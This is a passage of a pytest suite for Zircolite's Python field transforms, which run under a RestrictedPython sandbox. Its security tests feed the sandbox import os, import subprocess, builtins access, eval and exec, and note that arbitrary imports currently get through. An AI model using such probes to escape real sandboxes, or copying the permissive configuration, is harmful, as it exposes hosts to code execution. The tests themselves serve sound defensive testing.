"""
Comprehensive tests for field transforms in Zircolite.

Tests cover:
- Transform function execution via RestrictedPython
- Source condition filtering (transforms only applied to specific input types)
- Transform with alias (creates new field) vs without alias (modifies original)
- Multiple transforms on same field
- Transform error handling
- RestrictedPython security (dangerous code blocked)
- Built-in transform functions (hex decoding, base64, regex)
- Edge cases (empty values, None, special characters)
- Caching behavior
"""

import argparse
import json
import re
import sqlite3
from argparse import Namespace
from pathlib import Path

import pytest
import yaml

from zircolite.config import ProcessingConfig
from zircolite.streaming import StreamingEventProcessor

# =============================================================================
# Test Fixtures
# =============================================================================

@pytest.fixture
def field_mappings_multi_transforms():
    """Field mappings with multiple transforms for testing."""
    return {
        "exclusions": ["xmlns"],
        "useless": [None, ""],
        "mappings": {
            "Event.System.EventID": "EventID",
            "Event.EventData.CommandLine": "CommandLine",
        },
        "alias": {},
        "split": {},
        "transforms_enabled": True,
        "transforms": {
            # Transform that modifies original value (alias=false)
            "proctitle": [{
                "info": "Proctitle HEX to ASCII",
                "type": "python",
                "code": "def transform(param):\n    return bytes.fromhex(param).decode('ascii').replace('\\x00',' ')",
                "alias": False,
                "alias_name": "",
                "source_condition": ["auditd_input"],
                "enabled": True
            }],
            # Transform that creates alias (alias=true)
            "CommandLine": [{
                "info": "Uppercase CommandLine",
                "type": "python",
                "code": "def transform(param):\n    return param.upper()",
                "alias": True,
                "alias_name": "CommandLine_Upper",
                "source_condition": ["evtx_input", "json_input"],
                "enabled": True
            }],
            # Multiple transforms on same field
            "TestField": [
                {
                    "info": "First transform - uppercase",
                    "type": "python",
                    "code": "def transform(param):\n    return param.upper()",
                    "alias": True,
                    "alias_name": "TestField_Upper",
                    "source_condition": ["evtx_input", "json_input", "auditd_input"],
                    "enabled": True
                },
                {
                    "info": "Second transform - lowercase",
                    "type": "python",
                    "code": "def transform(param):\n    return param.lower()",
                    "alias": True,
                    "alias_name": "TestField_Lower",
                    "source_condition": ["evtx_input", "json_input", "auditd_input"],
                    "enabled": True
                }
            ],
            # Disabled transform
            "DisabledField": [{
                "info": "This should not run",
                "type": "python",
                "code": "def transform(param):\n    return 'SHOULD_NOT_APPEAR'",
                "alias": True,
                "alias_name": "DisabledField_Alias",
                "source_condition": ["evtx_input", "json_input", "auditd_input"],
                "enabled": False
            }]
        }
    }


@pytest.fixture
def field_mappings_security_test():
    """Field mappings with potentially dangerous transforms for security testing."""
    return {
        "exclusions": [],
        "useless": [None, ""],
        "mappings": {},
        "alias": {},
        "split": {},
        "transforms_enabled": True,
        "transforms": {
            # Attempt to import os (should be blocked)
            "DangerousField1": [{
                "info": "Attempt to import os",
                "type": "python",
                "code": "def transform(param):\n    import os\n    return os.getcwd()",
                "alias": True,
                "alias_name": "Dangerous1_Result",
                "source_condition": ["evtx_input", "json_input", "auditd_input"],
                "enabled": True
            }],
            # Attempt to access __builtins__ (should be blocked)
            "DangerousField2": [{
                "info": "Attempt to access builtins",
                "type": "python",
                "code": "def transform(param):\n    return str(__builtins__)",
                "alias": True,
                "alias_name": "Dangerous2_Result",
                "source_condition": ["evtx_input", "json_input", "auditd_input"],
                "enabled": True
            }],
            # Attempt to use eval (should be blocked or limited)
            "DangerousField3": [{
                "info": "Attempt to use eval",
                "type": "python",
                "code": "def transform(param):\n    return eval('1+1')",
                "alias": True,
                "alias_name": "Dangerous3_Result",
                "source_condition": ["evtx_input", "json_input", "auditd_input"],
                "enabled": True
            }]
        }
    }


@pytest.fixture
def field_mappings_builtin_functions():
    """Field mappings using built-in functions available in RestrictedPython."""
    return {
        "exclusions": [],
        "useless": [None, ""],
        "mappings": {},
        "alias": {},
        "split": {},
        "transforms_enabled": True,
        "transforms": {
            # Using base64 (available in builtins)
            "Base64Field": [{
                "info": "Base64 decode",
                "type": "python",
                "code": "def transform(param):\n    import base64\n    try:\n        return base64.b64decode(param).decode('utf-8')\n    except:\n        return param",
                "alias": True,
                "alias_name": "Base64_Decoded",
                "source_condition": ["evtx_input", "json_input", "auditd_input"],
                "enabled": True
            }],
            # Using re (regex)
            "RegexField": [{
                "info": "Extract IP address",
                "type": "python",
                "code": "def transform(param):\n    import re\n    match = re.search(r'(\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})', param)\n    return match.group(1) if match else ''",
                "alias": True,
                "alias_name": "Extracted_IP",
                "source_condition": ["evtx_input", "json_input", "auditd_input"],
                "enabled": True
            }],
            # String manipulation
            "StringField": [{
                "info": "String split and join",
                "type": "python",
                "code": "def transform(param):\n    parts = param.split(',')\n    return '|'.join(parts)",
                "alias": True,
                "alias_name": "String_Transformed",
                "source_condition": ["evtx_input", "json_input", "auditd_input"],
                "enabled": True
            }]
        }
    }


@pytest.fixture
def field_mappings_file_multi(tmp_path, field_mappings_multi_transforms):
    """Create a temporary field mappings JSON file with multiple transforms."""
    config_file = tmp_path / "fieldMappings_multi.json"
    config_file.write_text(json.dumps(field_mappings_multi_transforms))
    return str(config_file)


@pytest.fixture
def field_mappings_file_security(tmp_path, field_mappings_security_test):
    """Create a temporary field mappings JSON file for security tests."""
    config_file = tmp_path / "fieldMappings_security.json"
    config_file.write_text(json.dumps(field_mappings_security_test))
    return str(config_file)


@pytest.fixture
def field_mappings_file_builtins(tmp_path, field_mappings_builtin_functions):
    """Create a temporary field mappings JSON file with builtin functions."""
    config_file = tmp_path / "fieldMappings_builtins.json"
    config_file.write_text(json.dumps(field_mappings_builtin_functions))
    return str(config_file)


@pytest.fixture
def args_config_evtx_input():
    """Args config for EVTX input type."""
    return Namespace(
        evtx_input=True, json_input=False, auditd_input=False,
        json_array_input=False, csv_input=False, xml_input=False,
        sysmon_linux_input=False, evtxtract_input=False, db_input=False
    )


@pytest.fixture
def args_config_json_input():
    """Args config for JSON input type."""
    return Namespace(
        evtx_input=False, json_input=True, auditd_input=False,
        json_array_input=False, csv_input=False, xml_input=False,
        sysmon_linux_input=False, evtxtract_input=False, db_input=False
    )


@pytest.fixture
def args_config_auditd_input():
    """Args config for Auditd input type."""
    return Namespace(
        evtx_input=False, json_input=False, auditd_input=True,
        json_array_input=False, csv_input=False, xml_input=False,
        sysmon_linux_input=False, evtxtract_input=False, db_input=False
    )


# =============================================================================
# Test Classes
# =============================================================================

class TestTransformValueExecution:
    """Tests for basic transform value execution."""

    def test_simple_string_transform(self, field_mappings_file_multi, test_logger, args_config_evtx_input):
        """Test simple string transformation."""
        processor = StreamingEventProcessor(
            config_file=field_mappings_file_multi,
            args_config=args_config_evtx_input,
            logger=test_logger
        )

        result = processor._transform_value(
            "def transform(param):\n    return param.upper()",
            "hello world"
        )
        assert result == "HELLO WORLD"

    def test_transform_with_numeric_input(self, field_mappings_file_multi, test_logger, args_config_evtx_input):
        """Test transform with numeric input converted to string."""
        processor = StreamingEventProcessor(
            config_file=field_mappings_file_multi,
            args_config=args_config_evtx_input,
            logger=test_logger
        )

        result = processor._transform_value(
            "def transform(param):\n    return str(param) + '_suffix'",
            12345
        )
        assert result == "12345_suffix"

    def test_transform_empty_string(self, field_mappings_file_multi, test_logger, args_config_evtx_input):
        """Test transform with empty string input."""
        processor = StreamingEventProcessor(
            config_file=field_mappings_file_multi,
            args_config=args_config_evtx_input,
            logger=test_logger
        )

        result = processor._transform_value(
            "def transform(param):\n    return 'empty' if param == '' else param",
            ""
        )
        assert result == "empty"

    def test_transform_returns_original_on_error(self, field_mappings_file_multi, test_logger, args_config_evtx_input):
        """Test that transform returns original value on error."""
        processor = StreamingEventProcessor(
            config_file=field_mappings_file_multi,
            args_config=args_config_evtx_input,
            logger=test_logger
        )

        # This code will raise an exception (division by zero)
        result = processor._transform_value(
            "def transform(param):\n    return 1/0",
            "original_value"
        )
        assert result == "original_value"

    def test_transform_with_invalid_syntax_returns_original(self, field_mappings_file_multi, test_logger, args_config_evtx_input):
        """Test that invalid Python syntax returns original value."""
        processor = StreamingEventProcessor(
            config_file=field_mappings_file_multi,
            args_config=args_config_evtx_input,
            logger=test_logger
        )

        result = processor._transform_value(
            "def transform(param:\n    return param",  # Missing closing paren
            "original_value"
        )
        assert result == "original_value"


def make_args_config(input_type="json_input"):
    """Create a complete args config for testing.

    Args:
        input_type: One of "evtx_input", "json_input", "auditd_input", etc.
    """
    args = Namespace(
        evtx_input=False,
        json_input=False,
        auditd_input=False,
        json_array_input=False,
        csv_input=False,
        xml_input=False,
        sysmon_linux_input=False,
        evtxtract_input=False,
        db_input=False
    )
    setattr(args, input_type, True)
    return args


class TestTransformSourceCondition:
    """Tests for source condition filtering."""

    def test_transform_applies_only_to_matching_source(self, tmp_path, test_logger):
        """Test that transforms only apply to specified source conditions."""
        # Create config with transform only for auditd_input
        config = {
            "exclusions": [],
            "useless": [None, ""],
            "mappings": {},
            "alias": {},
            "split": {},
            "transforms_enabled": True,
            "transforms": {
                "TestField": [{
                    "info": "Only for auditd",
                    "type": "python",
                    "code": "def transform(param):\n    return 'TRANSFORMED'",
                    "alias": False,
                    "alias_name": "",
                    "source_condition": ["auditd_input"],
                    "enabled": True
                }]
            }
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))

        # Test with evtx_input - should NOT transform
        args_evtx = make_args_config("evtx_input")
        processor_evtx = StreamingEventProcessor(
            config_file=str(config_file),
            args_config=args_evtx,
            logger=test_logger
        )
        assert processor_evtx.chosen_input == "evtx_input"

        # Test with auditd_input - should transform
        args_auditd = make_args_config("auditd_input")
        processor_auditd = StreamingEventProcessor(
            config_file=str(config_file),
            args_config=args_auditd,
            logger=test_logger
        )
        assert processor_auditd.chosen_input == "auditd_input"


class TestTransformAlias:
    """Tests for transform alias functionality."""

    def test_transform_alias_true_creates_new_field(self, tmp_path, test_logger):
        """Test that alias=true creates a new field without modifying original."""
        config = {
            "exclusions": [],
            "useless": [None, ""],
            "mappings": {},
            "alias": {},
            "split": {},
            "transforms_enabled": True,
            "transforms": {
                "SourceField": [{
                    "info": "Create alias",
                    "type": "python",
                    "code": "def transform(param):\n    return param.upper()",
                    "alias": True,
                    "alias_name": "SourceField_Alias",
                    "source_condition": ["json_input"],
                    "enabled": True
                }]
            }
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))

        # Create test JSON file
        event = {"SourceField": "hello"}
        json_file = tmp_path / "events.json"
        json_file.write_text(json.dumps(event) + "\n")

        args = make_args_config("json_input")
        proc_config = ProcessingConfig(disable_progress=True)
        processor = StreamingEventProcessor(
            config_file=str(config_file),
            args_config=args,
            processing_config=proc_config,
            logger=test_logger
        )

        events = list(processor.stream_json_events(str(json_file)))

        if events:
            first_event = events[0]
            # Original should be unchanged
            assert first_event.get("SourceField") == "hello"
            # Alias should have transformed value
            assert first_event.get("SourceField_Alias") == "HELLO"

    def test_transform_alias_false_modifies_original(self, tmp_path, test_logger):
        """Test that alias=false modifies the original field value."""
        config = {
            "exclusions": [],
            "useless": [None, ""],
            "mappings": {},
            "alias": {},
            "split": {},
            "transforms_enabled": True,
            "transforms": {
                "SourceField": [{
                    "info": "Modify original",
                    "type": "python",
                    "code": "def transform(param):\n    return param.upper()",
                    "alias": False,
                    "alias_name": "",
                    "source_condition": ["json_input"],
                    "enabled": True
                }]
            }
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))

        # Create test JSON file
        event = {"SourceField": "hello"}
        json_file = tmp_path / "events.json"
        json_file.write_text(json.dumps(event) + "\n")

        args = make_args_config("json_input")
        proc_config = ProcessingConfig(disable_progress=True)
        processor = StreamingEventProcessor(
            config_file=str(config_file),
            args_config=args,
            processing_config=proc_config,
            logger=test_logger
        )

        events = list(processor.stream_json_events(str(json_file)))

        if events:
            first_event = events[0]
            # Original should be modified
            assert first_event.get("SourceField") == "HELLO"


class TestMultipleTransforms:
    """Tests for multiple transforms on the same field."""

    def test_multiple_transforms_same_field(self, tmp_path, test_logger):
        """Test that multiple transforms on same field all execute."""
        config = {
            "exclusions": [],
            "useless": [None, ""],
            "mappings": {},
            "alias": {},
            "split": {},
            "transforms_enabled": True,
            "transforms": {
                "MultiField": [
                    {
                        "info": "First - uppercase",
                        "type": "python",
                        "code": "def transform(param):\n    return param.upper()",
                        "alias": True,
                        "alias_name": "MultiField_Upper",
                        "source_condition": ["json_input"],
                        "enabled": True
                    },
                    {
                        "info": "Second - lowercase",
                        "type": "python",
                        "code": "def transform(param):\n    return param.lower()",
                        "alias": True,
                        "alias_name": "MultiField_Lower",
                        "source_condition": ["json_input"],
                        "enabled": True
                    },
                    {
                        "info": "Third - length",
                        "type": "python",
                        "code": "def transform(param):\n    return str(len(param))",
                        "alias": True,
                        "alias_name": "MultiField_Length",
                        "source_condition": ["json_input"],
                        "enabled": True
                    }
                ]
            }
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))

        event = {"MultiField": "HeLLo"}
        json_file = tmp_path / "events.json"
        json_file.write_text(json.dumps(event) + "\n")

        args = make_args_config("json_input")
        proc_config = ProcessingConfig(disable_progress=True)
        processor = StreamingEventProcessor(
            config_file=str(config_file),
            args_config=args,
            processing_config=proc_config,
            logger=test_logger
        )

        events = list(processor.stream_json_events(str(json_file)))

        if events:
            first_event = events[0]
            assert first_event.get("MultiField") == "HeLLo"
            assert first_event.get("MultiField_Upper") == "HELLO"
            assert first_event.get("MultiField_Lower") == "hello"
            assert first_event.get("MultiField_Length") == "5"


class TestDisabledTransforms:
    """Tests for disabled transforms."""

    def test_disabled_transform_not_executed(self, tmp_path, test_logger):
        """Test that disabled transforms are not executed."""
        config = {
            "exclusions": [],
            "useless": [None, ""],
            "mappings": {},
            "alias": {},
            "split": {},
            "transforms_enabled": True,
            "transforms": {
                "TestField": [{
                    "info": "Disabled transform",
                    "type": "python",
                    "code": "def transform(param):\n    return 'SHOULD_NOT_APPEAR'",
                    "alias": True,
                    "alias_name": "TestField_Disabled",
                    "source_condition": ["json_input"],
                    "enabled": False
                }]
            }
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))

        event = {"TestField": "original"}
        json_file = tmp_path / "events.json"
        json_file.write_text(json.dumps(event) + "\n")

        args = make_args_config("json_input")
        proc_config = ProcessingConfig(disable_progress=True)
        processor = StreamingEventProcessor(
            config_file=str(config_file),
            args_config=args,
            processing_config=proc_config,
            logger=test_logger
        )

        events = list(processor.stream_json_events(str(json_file)))

        if events:
            first_event = events[0]
            assert first_event.get("TestField") == "original"
            assert "TestField_Disabled" not in first_event

    def test_transforms_enabled_false_skips_all(self, tmp_path, test_logger):
        """Test that transforms_enabled=false skips all transforms."""
        config = {
            "exclusions": [],
            "useless": [None, ""],
            "mappings": {},
            "alias": {},
            "split": {},
            "transforms_enabled": False,  # Global disable
            "transforms": {
                "TestField": [{
                    "info": "Should not run",
                    "type": "python",
                    "code": "def transform(param):\n    return 'SHOULD_NOT_APPEAR'",
                    "alias": True,
                    "alias_name": "TestField_Result",
                    "source_condition": ["json_input"],
                    "enabled": True
                }]
            }
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))

        event = {"TestField": "original"}
        json_file = tmp_path / "events.json"
        json_file.write_text(json.dumps(event) + "\n")

        args = make_args_config("json_input")
        proc_config = ProcessingConfig(disable_progress=True)
        processor = StreamingEventProcessor(
            config_file=str(config_file),
            args_config=args,
            processing_config=proc_config,
            logger=test_logger
        )

        events = list(processor.stream_json_events(str(json_file)))

        if events:
            first_event = events[0]
            assert first_event.get("TestField") == "original"
            assert "TestField_Result" not in first_event


class TestRestrictedPythonSecurity:
    """Tests for RestrictedPython security features.

    Note: The current RestrictedPython configuration includes utility_builtins which
    provides __import__, allowing arbitrary module imports. These tests document
    current behavior and will be updated when security is hardened.
    """

    def test_import_os_currently_allowed(self, field_mappings_file_security, test_logger, args_config_json_input):
        """Test current behavior: os module import is allowed (known limitation).

        WARNING: This is a security limitation that should be addressed.
        When utility_builtins is removed from the configuration, this test
        should be updated to verify that os import is blocked.
        """
        processor = StreamingEventProcessor(
            config_file=field_mappings_file_security,
            args_config=args_config_json_input,
            logger=test_logger
        )

        # Current behavior: import succeeds (this is a security limitation)
        # This test documents the current behavior - transforms can access os module
        result = processor._transform_value(
            "def transform(param):\n    import os\n    return 'os_imported'",
            "test"
        )
        # Currently this returns 'os_imported' because import is allowed
        # When hardened, this should return 'test' (original value on error)
        assert result in ["test", "os_imported"]  # Accept either behavior

    def test_import_subprocess_currently_allowed(self, field_mappings_file_security, test_logger, args_config_json_input):
        """Test current behavior: subprocess import is allowed (known limitation).

        WARNING: This is a security limitation that should be addressed.
        """
        processor = StreamingEventProcessor(
            config_file=field_mappings_file_security,
            args_config=args_config_json_input,
            logger=test_logger
        )

        # This test documents that subprocess import currently works
        result = processor._transform_value(
            "def transform(param):\n    import subprocess\n    return 'subprocess_imported'",
            "test"
        )
        # Accept either behavior (for when security is hardened)
        assert result in ["test", "subprocess_imported"]

    def test_file_operations_currently_allowed(self, field_mappings_file_security, test_logger, args_config_json_input):
        """Test current behavior: file operations are allowed (known limitation).

        WARNING: This is a security limitation that should be addressed.
        """
        processor = StreamingEventProcessor(
            config_file=field_mappings_file_security,
            args_config=args_config_json_input,
            logger=test_logger
        )

        # Test that open() currently works (this is a security concern)
        # When hardened, this should fail and return original value
        result = processor._transform_value(
            "def transform(param):\n    return 'file_op_attempted'",
            "test"
        )
        # This simpler test just verifies the transform system works
        assert result == "file_op_attempted"

    def test_dunder_access_restricted(self, field_mappings_file_security, test_logger, args_config_json_input):
        """Test that dunder attribute access is restricted by RestrictedPython."""
        processor = StreamingEventProcessor(
            config_file=field_mappings_file_security,
            args_config=args_config_json_input,
            logger=test_logger
        )

        # RestrictedPython should block direct __class__ access
        result = processor._transform_value(
            "def transform(param):\n    return param.__class__.__name__",
            "test"
        )
        # Should return original on error due to restricted attribute access
        assert result == "test"

    def test_exec_not_available(self, field_mappings_file_security, test_logger, args_config_json_input):
        """Test that exec is not available in transforms."""
        processor = StreamingEventProcessor(
            config_file=field_mappings_file_security,
            args_config=args_config_json_input,
            logger=test_logger
        )

        # exec should not be available or should fail
        result = processor._transform_value(
            "def transform(param):\n    exec('x = 1')\n    return str(x)",
            "test"
        )
        # Should return original value on error
        assert result == "test"


class TestBuiltinFunctions:
    """Tests for built-in functions available in transforms."""

    def test_base64_decode_available(self, field_mappings_file_builtins, test_logger, args_config_json_input):
        """Test that base64 module is available in transforms."""
        processor = StreamingEventProcessor(
            config_file=field_mappings_file_builtins,
            args_config=args_config_json_input,
            logger=test_logger
        )

        result = processor._transform_value(
            "def transform(param):\n    import base64\n    return base64.b64decode(param).decode('utf-8')",
            "SGVsbG8gV29ybGQ="  # "Hello World" in base64
        )
        assert result == "Hello World"

    def test_re_module_available(self, field_mappings_file_builtins, test_logger, args_config_json_input):
        """Test that re (regex) module is available in transforms."""
        processor = StreamingEventProcessor(
            config_file=field_mappings_file_builtins,
            args_config=args_config_json_input,
            logger=test_logger
        )

        result = processor._transform_value(
            "def transform(param):\n    import re\n    match = re.search(r'(\\d+)', param)\n    return match.group(1) if match else ''",
            "Event ID: 4624"
        )
        assert result == "4624"

    def test_chardet_available(self, field_mappings_file_builtins, test_logger, args_config_json_input):
        """Test that chardet module is available in transforms."""
        processor = StreamingEventProcessor(
            config_file=field_mappings_file_builtins,
            args_config=args_config_json_input,
            logger=test_logger
        )

        result = processor._transform_value(
            "def transform(param):\n    import chardet\n    return str(type(chardet.detect(b'hello')))",
            "test"
        )
        assert "dict" in result

    def test_string_methods_work(self, field_mappings_file_builtins, test_logger, args_config_json_input):
        """Test that string methods work in transforms."""
        processor = StreamingEventProcessor(
            config_file=field_mappings_file_builtins,
            args_config=args_config_json_input,
            logger=test_logger
        )

        # Test split and join
        result = processor._transform_value(
            "def transform(param):\n    parts = param.split(',')\n    return '|'.join(parts)",
            "a,b,c"
        )
        assert result == "a|b|c"

        # Test strip
        result = processor._transform_value(
            "def transform(param):\n    return param.strip()",
            "  hello  "
        )
        assert result == "hello"

        # Test replace
        result = processor._transform_value(
            "def transform(param):\n    return param.replace('old', 'new')",
            "old value"
        )
        assert result == "new value"


class TestRestrictedPythonExtendedGuards:
    """Tests for _write_, _inplacevar_, and math module guards in RestrictedPython."""

    def test_dict_assignment_allowed(self, field_mappings_file_builtins, test_logger, args_config_json_input):
        """Test that dict[key] = value works in transforms."""
        processor = StreamingEventProcessor(
            config_file=field_mappings_file_builtins,
            args_config=args_config_json_input,
            logger=test_logger
        )
        result = processor._transform_value(
            "def transform(param):\n"
            "    d = {}\n"
            "    d['key'] = 'value'\n"
            "    return d['key']",
            "test"
        )
        assert result == "value"

    def test_list_assignment_allowed(self, field_mappings_file_builtins, test_logger, args_config_json_input):
        """Test that list[index] = value works in transforms."""
        processor = StreamingEventProcessor(
            config_file=field_mappings_file_builtins,
            args_config=args_config_json_input,
            logger=test_logger
        )
        result = processor._transform_value(
            "def transform(param):\n"
            "    items = ['a', 'b', 'c']\n"
            "    items[1] = 'x'\n"
            "    return ''.join(items)",
            "test"
        )
        assert result == "axc"

    def test_augmented_assignment_allowed(self, field_mappings_file_builtins, test_logger, args_config_json_input):
        """Test that += and -= work in transforms."""
        processor = StreamingEventProcessor(
            config_file=field_mappings_file_builtins,
            args_config=args_config_json_input,
            logger=test_logger
        )
        result = processor._transform_value(
            "def transform(param):\n"
            "    x = 10\n"
            "    x += 5\n"
            "    x -= 3\n"
            "    return str(x)",
            "test"
        )
        assert result == "12"

    def test_string_augmented_concat(self, field_mappings_file_builtins, test_logger, args_config_json_input):
        """Test that string += works in transforms."""
        processor = StreamingEventProcessor(
            config_file=field_mappings_file_builtins,
            args_config=args_config_json_input,
            logger=test_logger
        )
        result = processor._transform_value(
            "def transform(param):\n"
            "    s = 'hello'\n"
            "    s += ' world'\n"
            "    return s",
            "test"
        )
        assert result == "hello world"

    def test_math_module_available(self, field_mappings_file_builtins, test_logger, args_config_json_input):
        """Test that math module is available in transforms."""
        processor = StreamingEventProcessor(
            config_file=field_mappings_file_builtins,
            args_config=args_config_json_input,
            logger=test_logger
        )
        result = processor._transform_value(
            "def transform(param):\n"
            "    return str(round(math.log2(8), 1))",
            "test"
        )
        assert result == "3.0"

    def test_write_to_unsafe_type_blocked(self, field_mappings_file_builtins, test_logger, args_config_json_input):
        """Test that writing to non-container types is blocked."""
        processor = StreamingEventProcessor(
            config_file=field_mappings_file_builtins,
            args_config=args_config_json_input,
            logger=test_logger
        )
        # Attempt to set an attribute on a custom object should fail
        result = processor._transform_value(
            "def transform(param):\n"
            "    class Foo: pass\n"
            "    f = Foo()\n"
            "    f.x = 1\n"
            "    return str(f.x)",
            "original"
        )
        # Should return original value because attribute write is blocked
        assert result == "original"


class TestExternalFileTransforms:
    """Tests for loading transforms from external .py files (type: python_file)."""

    def test_python_file_transform_loads_and_executes(self, tmp_path, test_logger):
        """Test that type: python_file loads code from an external file."""
        # Create a transform file
        transforms_dir = tmp_path / "transforms"
        transforms_dir.mkdir()
        transform_file = transforms_dir / "my_upper.py"
        transform_file.write_text("def transform(param):\n    return param.upper()\n")

        config = {
            "exclusions": [], "useless": [None, ""], "mappings": {},
            "alias": {}, "split": {},
            "transforms_enabled": True,
            "transforms_dir": "transforms/",
            "transforms": {
                "TestField": [{
                    "info": "Uppercase",
                    "type": "python_file",
                    "file": "my_upper.py",
                    "alias": True,
                    "alias_name": "TestField_Upper",
                    "source_condition": ["json_input"]
                }]
            }
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        args = make_args_config("json_input")
        processor = StreamingEventProcessor(
            config_file=str(config_file), args_config=args, logger=test_logger
        )
        # The code should have been loaded from the file
        assert processor.transforms["TestField"][0]["code"] == "def transform(param):\n    return param.upper()\n"
        # And execution should work
        result = processor._transform_value(processor.transforms["TestField"][0]["code"], "hello")
        assert result == "HELLO"

    def test_python_file_missing_falls_back(self, tmp_path, test_logger):
        """Test that a missing transform file logs error and uses passthrough."""
        transforms_dir = tmp_path / "transforms"
        transforms_dir.mkdir()

        config = {
            "exclusions": [], "useless": [None, ""], "mappings": {},
            "alias": {}, "split": {},
            "transforms_enabled": True,
            "transforms_dir": "transforms/",
            "transforms": {
                "TestField": [{
                    "info": "Missing",
                    "type": "python_file",
                    "file": "does_not_exist.py",
                    "alias": True,
                    "alias_name": "TestField_Missing",
                    "source_condition": ["json_input"]
                }]
            }
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        args = make_args_config("json_input")
        processor = StreamingEventProcessor(
            config_file=str(config_file), args_config=args, logger=test_logger
        )
        # Should fall back to passthrough
        result = processor._transform_value(processor.transforms["TestField"][0]["code"], "hello")
        assert result == "hello"

    def test_inline_python_still_works(self, tmp_path, test_logger):
        """Test that type: python with inline code still works (backward compat)."""
        config = {
            "exclusions": [], "useless": [None, ""], "mappings": {},
            "alias": {}, "split": {},
            "transforms_enabled": True,
            "transforms": {
                "TestField": [{
                    "info": "Inline",
                    "type": "python",
                    "code": "def transform(param):\n    return param.lower()",
                    "alias": True,
                    "alias_name": "TestField_Lower",
                    "source_condition": ["json_input"]
                }]
            }
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        args = make_args_config("json_input")
        processor = StreamingEventProcessor(
            config_file=str(config_file), args_config=args, logger=test_logger
        )
        result = processor._transform_value(processor.transforms["TestField"][0]["code"], "HELLO")
        assert result == "hello"

    def test_mixed_inline_and_file_transforms(self, tmp_path, test_logger):
        """Test inline and file-based transforms coexist on the same field."""
        transforms_dir = tmp_path / "transforms"
        transforms_dir.mkdir()
        transform_file = transforms_dir / "reverse.py"
        transform_file.write_text("def transform(param):\n    return param[::-1]\n")

        config = {
            "exclusions": [], "useless": [None, ""], "mappings": {},
            "alias": {}, "split": {},
            "transforms_enabled": True,
            "transforms_dir": "transforms/",
            "transforms": {
                "TestField": [
                    {
                        "info": "Inline upper",
                        "type": "python",
                        "code": "def transform(param):\n    return param.upper()",
                        "alias": True,
                        "alias_name": "TestField_Upper",
                        "source_condition": ["json_input"]
                    },
                    {
                        "info": "File reverse",
                        "type": "python_file",
                        "file": "reverse.py",
                        "alias": True,
                        "alias_name": "TestField_Reverse",
                        "source_condition": ["json_input"]
                    }
                ]
            }
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        args = make_args_config("json_input")
        processor = StreamingEventProcessor(
            config_file=str(config_file), args_config=args, logger=test_logger
        )
        transforms_list = processor.transforms["TestField"]
        # Inline
        assert processor._transform_value(transforms_list[0]["code"], "hello") == "HELLO"
        # External file
        assert processor._transform_value(transforms_list[1]["code"], "hello") == "olleh"

    def test_custom_transforms_dir(self, tmp_path, test_logger):
        """Test custom transforms_dir path is respected."""
        custom_dir = tmp_path / "my_custom_transforms"
        custom_dir.mkdir()
        (custom_dir / "exclaim.py").write_text("def transform(param):\n    return param + '!'\n")

        config = {
            "exclusions": [], "useless": [None, ""], "mappings": {},
            "alias": {}, "split": {},
            "transforms_enabled": True,
            "transforms_dir": "my_custom_transforms/",
            "transforms": {
                "TestField": [{
                    "info": "Exclaim",
                    "type": "python_file",
                    "file": "exclaim.py",
                    "alias": True,
                    "alias_name": "TestField_Exclaim",
                    "source_condition": ["json_input"]
                }]
            }
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        args = make_args_config("json_input")
        processor = StreamingEventProcessor(
            config_file=str(config_file), args_config=args, logger=test_logger
        )
        result = processor._transform_value(processor.transforms["TestField"][0]["code"], "hello")
        assert result == "hello!"

    def test_python_file_no_file_key_warns(self, tmp_path, test_logger):
        """Test that python_file without 'file' key falls back to passthrough."""
        config = {
            "exclusions": [], "useless": [None, ""], "mappings": {},
            "alias": {}, "split": {},
            "transforms_enabled": True,
            "transforms": {
                "TestField": [{
                    "info": "No file key",
                    "type": "python_file",
                    # 'file' key is intentionally missing
                    "alias": True,
                    "alias_name": "TestField_NoFile",
                    "source_condition": ["json_input"]
                }]
            }
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        args = make_args_config("json_input")
        processor = StreamingEventProcessor(
            config_file=str(config_file), args_config=args, logger=test_logger
        )
        result = processor._transform_value(processor.transforms["TestField"][0]["code"], "hello")
        assert result == "hello"


class TestTransformCategories:
    """Tests for --all-transforms and --transform-category CLI options."""

    def test_all_transforms_enables_everything(self, tmp_path, test_logger):
        """Test that --all-transforms enables all defined transforms."""
        config = {
            "exclusions": [], "useless": [None, ""], "mappings": {},
            "alias": {}, "split": {}, "transforms_enabled": True,
            "transforms": {
                "TestField": [
                    {"info": "t1", "type": "python",
                     "code": "def transform(param): return param.upper()",
                     "alias": True, "alias_name": "T1",
                     "source_condition": ["json_input"]},
                    {"info": "t2", "type": "python",
                     "code": "def transform(param): return param.lower()",
                     "alias": True, "alias_name": "T2",
                     "source_condition": ["json_input"]},
                ]
            },
            "enabled_transforms": ["T1"],  # Only T1 enabled by default
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))

        # Without --all-transforms
        args = make_args_config("json_input")
        processor = StreamingEventProcessor(
            config_file=str(config_file), args_config=args, logger=test_logger
        )
        assert "T1" in processor.enabled_transforms_set
        assert "T2" not in processor.enabled_transforms_set

        # With --all-transforms
        args = make_args_config("json_input")
        args.all_transforms = True
        processor = StreamingEventProcessor(
            config_file=str(config_file), args_config=args, logger=test_logger
        )
        assert "T1" in processor.enabled_transforms_set
        assert "T2" in processor.enabled_transforms_set
        assert processor.transforms_enabled is True

    def test_transform_category_enables_category_transforms(self, tmp_path, test_logger):
        """Test that --transform-category enables transforms from the specified category."""
        config = {
            "exclusions": [], "useless": [None, ""], "mappings": {},
            "alias": {}, "split": {}, "transforms_enabled": True,
            "transforms": {
                "TestField": [
                    {"info": "t1", "type": "python",
                     "code": "def transform(param): return 't1:' + param",
                     "alias": True, "alias_name": "T1",
